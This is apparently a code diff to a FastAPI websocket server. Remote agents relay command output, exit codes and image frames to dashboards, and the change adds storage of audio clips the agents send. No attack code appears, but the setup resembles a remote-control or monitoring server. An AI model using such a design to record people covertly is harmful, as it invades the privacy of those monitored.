@@ -16,7 +16,7 @@ router = APIRouter()
 MEDIA_ROOT = os.getenv("MEDIA_ROOT", os.path.join(os.path.dirname(__file__), 'media'))
 
 async def _store_media_event(kind: str, agent_id: str, frame: dict):
-    # frame: {data: data_url, w: int, h: int}
+    # frame: {data: data_url, w?: int, h?: int}
     durl = frame.get('data') or ''
     if not (isinstance(durl, str) and durl.startswith('data:')):
         return
@@ -24,10 +24,21 @@ async def _store_media_event(kind: str, agent_id: str, frame: dict):
         header, b64 = durl.split(';base64,', 1)
     except ValueError:
         return
-    mime = header[5:] if header.startswith('data:') else 'image/jpeg'
-    ext = 'jpg'
+    mime = header[5:] if header.startswith('data:') else 'application/octet-stream'
+    # Decide extension by mime
+    ext = 'bin'
     if 'png' in mime:
         ext = 'png'
+    elif 'jpeg' in mime or 'jpg' in mime:
+        ext = 'jpg'
+    elif 'webm' in mime:
+        ext = 'webm'
+    elif 'wav' in mime:
+        ext = 'wav'
+    elif 'mp3' in mime:
+        ext = 'mp3'
+    elif 'ogg' in mime:
+        ext = 'ogg'
     now = dt.datetime.utcnow()
     sub = now.strftime('%Y%m')
     out_dir = os.path.join(MEDIA_ROOT, kind, sub)
@@ -191,6 +202,14 @@ async def ws_agent(ws: WebSocket):
                 await manager.relay_output_to_dashboards(agent_id, str(data['line']))
             elif 'exit_code' in data:
                 await manager.relay_exit_to_dashboards(agent_id, int(data['exit_code']))
+            elif data.get('type') == 'audio_segment':
+                # Persist audio clip under 'audio' kind
+                try:
+                    await _store_media_event('audio', agent_id, data)
+                except Exception:
+                    pass
+                # Optionally notify dashboards
+                await manager.relay_output_to_dashboards(agent_id, '[audio saved]\n')
             elif 'error' in data:
                 await manager.relay_output_to_dashboards(agent_id, str(data['error']))
             else:
